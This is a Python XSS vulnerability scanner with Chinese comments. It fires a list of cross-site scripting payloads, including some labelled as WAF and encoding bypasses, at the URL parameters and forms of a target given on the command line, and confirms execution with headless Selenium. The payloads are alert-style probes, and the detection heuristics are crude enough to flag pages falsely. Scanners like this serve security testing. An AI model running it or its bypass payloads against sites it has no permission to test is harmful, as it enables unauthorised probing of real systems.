#!/usr/bin/env python3
# scripts/xss_scanner.py

import sys
import json
import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class AdvancedXSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # 高级 XSS payloads
        self.advanced_payloads = [
            # WAF 绕过
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=\x61lert("XSS")>',
            '"><svg onload=alert("XSS")>',
            
            # 上下文绕过
            '";alert("XSS");"',
            "';alert('XSS');//",
            '</textarea><script>alert("XSS")</script>',
            '</title><script>alert("XSS")</script>',
            
            # 编码绕过
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;">',
            '<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29")</script>',
            
            # 多重编码
            '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
            '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
        ]
        
        self.results = []

    def scan_forms(self):
        """扫描页面中的表单"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                # 构建完整的 action URL
                form_url = urljoin(self.target_url, action)
                
                # 获取表单字段
                inputs = form.find_all(['input', 'textarea', 'select'])
                form_data = {}
                
                for input_field in inputs:
                    name = input_field.get('name')
                    if name:
                        input_type = input_field.get('type', 'text')
                        if input_type not in ['submit', 'reset', 'button']:
                            form_data[name] = 'test_value'
                
                # 测试表单
                if form_data:
                    self.test_form(form_url, method, form_data)
                    
        except Exception as e:
            self.results.append({
                'payload': 'form_scan',
                'vulnerable': False,
                'error': str(e),
                'method': 'form_analysis'
            })

    def test_form(self, form_url, method, form_data):
        """测试单个表单的 XSS 漏洞"""
        for payload in self.advanced_payloads[:5]:  # 限制测试数量
            test_data = form_data.copy()
            
            # 在每个字段中测试 payload
            for field_name in test_data:
                test_data[field_name] = payload
                
                try:
                    if method == 'post':
                        response = self.session.post(form_url, data=test_data, timeout=10)
                    else:
                        response = self.session.get(form_url, params=test_data, timeout=10)
                    
                    vulnerable = self.detect_xss_in_response(response.text, payload)
                    
                    self.results.append({
                        'payload': payload,
                        'vulnerable': vulnerable,
                        'method': f'form_{method}',
                        'field': field_name,
                        'url': form_url,
                        'context': self.extract_context(response.text, payload) if vulnerable else None
                    })
                    
                except Exception as e:
                    self.results.append({
                        'payload': payload,
                        'vulnerable': False,
                        'error': str(e),
                        'method': f'form_{method}',
                        'field': field_name
                    })
                
                # 恢复原始值
                test_data[field_name] = form_data[field_name]

    def scan_url_parameters(self):
        """扫描 URL 参数"""
        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            # 如果没有参数，尝试常见参数名
            common_params = ['q', 'search', 'query', 'id', 'page', 'category']
            for param in common_params:
                self.test_parameter(param, 'test_value')
        else:
            # 测试现有参数
            for param_name, param_values in params.items():
                self.test_parameter(param_name, param_values[0] if param_values else 'test')

    def test_parameter(self, param_name, original_value):
        """测试单个参数的 XSS 漏洞"""
        base_url = self.target_url.split('?')[0]
        
        for payload in self.advanced_payloads:
            try:
                test_url = f"{base_url}?{param_name}={payload}"
                response = self.session.get(test_url, timeout=10)
                
                vulnerable = self.detect_xss_in_response(response.text, payload)
                
                self.results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'method': 'url_parameter',
                    'parameter': param_name,
                    'url': test_url,
                    'context': self.extract_context(response.text, payload) if vulnerable else None
                })
                
            except Exception as e:
                self.results.append({
                    'payload': payload,
                    'vulnerable': False,
                    'error': str(e),
                    'method': 'url_parameter',
                    'parameter': param_name
                })

    def detect_xss_in_response(self, response_text, payload):
        """检测响应中是否存在 XSS"""
        # 直接匹配
        if payload in response_text:
            return True
        
        # 检查危险模式
        dangerous_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'<svg[^>]*onload',
            r'<img[^>]*onerror'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False

    def extract_context(self, response_text, payload):
        """提取 payload 在响应中的上下文"""
        try:
            index = response_text.find(payload)
            if index != -1:
                start = max(0, index - 100)
                end = min(len(response_text), index + len(payload) + 100)
                return response_text[start:end].strip()
        except:
            pass
        return None

    def dynamic_scan_with_selenium(self):
        """使用 Selenium 进行动态扫描"""
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        
        try:
            driver = webdriver.Chrome(options=chrome_options)
            
            # 测试基本 payload
            test_payloads = [
                '<script>document.title="XSS_DETECTED"</script>',
                '<img src=x onerror="document.title=\'IMG_XSS_DETECTED\'">',
            ]
            
            for payload in test_payloads:
                try:
                    test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}test={payload}"
                    driver.get(test_url)
                    
                    # 等待页面加载
                    WebDriverWait(driver, 5).until(
                        lambda d: d.execute_script("return document.readyState") == "complete"
                    )
                    
                    # 检查标题是否被修改（说明 JavaScript 执行了）
                    title = driver.title
                    vulnerable = 'XSS_DETECTED' in title or 'IMG_XSS_DETECTED' in title
                    
                    self.results.append({
                        'payload': payload,
                        'vulnerable': vulnerable,
                        'method': 'selenium_dynamic',
                        'evidence': f'Title changed to: {title}' if vulnerable else None
                    })
                    
                except Exception as e:
                    self.results.append({
                        'payload': payload,
                        'vulnerable': False,
                        'error': str(e),
                        'method': 'selenium_dynamic'
                    })
            
        except Exception as e:
            self.results.append({
                'payload': 'selenium_scan',
                'vulnerable': False,
                'error': f'Selenium setup failed: {str(e)}',
                'method': 'selenium_dynamic'
            })
        finally:
            try:
                driver.quit()
            except:
                pass

    def run_scan(self):
        """运行完整扫描"""
        try:
            # 1. URL 参数扫描
            self.scan_url_parameters()
            
            # 2. 表单扫描
            self.scan_forms()
            
            # 3. 动态扫描（如果安装了 Selenium）
            try:
                self.dynamic_scan_with_selenium()
            except ImportError:
                # Selenium 未安装，跳过动态扫描
                pass
            
        except Exception as e:
            self.results.append({
                'payload': 'general_scan',
                'vulnerable': False,
                'error': f'General scan error: {str(e)}',
                'method': 'error'
            })
        
        return self.results

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 xss_scanner.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    scanner = AdvancedXSSScanner(target_url)
    results = scanner.run_scan()
    
    # 输出 JSON 格式结果
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()